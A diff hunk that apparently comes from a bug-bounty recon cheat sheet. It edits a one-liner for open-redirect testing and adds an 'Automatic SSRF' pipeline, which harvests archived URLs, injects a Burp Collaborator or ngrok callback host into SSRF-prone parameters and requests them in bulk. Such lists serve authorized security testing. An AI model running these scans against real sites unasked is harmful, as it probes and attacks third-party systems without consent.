@@ -95,7 +95,13 @@ for scope in $(cat domains.txt);do curl "https://web.archive.org/cdx/search/cdx?
 ### Easy Open Redirect by endpoint injection
 
 ```
-for x in $(cat domains.txt | assetfinder -subs-only | httpx -silent);do echo "$x//<BURP SUITE DOMAIN OR NGROK>/%2F.." | httpx -silent -follow-redirects;done
+for x in $(cat domains.txt | assetfinder -subs-only | httpx -silent);do echo "$x//<BURP SUITE COLLABORATOR OR NGROK>/%2F.." | httpx -silent -follow-redirects;done
+```
+
+### Automatic SSRF
+
+```
+cat subdomains.txt | waybackurls | gf ssrf | qsreplace <http://BURP SUITE COLLABORATOR OR NGROK> | httpx -silent -follow-redirects
 ```
 
 # Google Dorks:
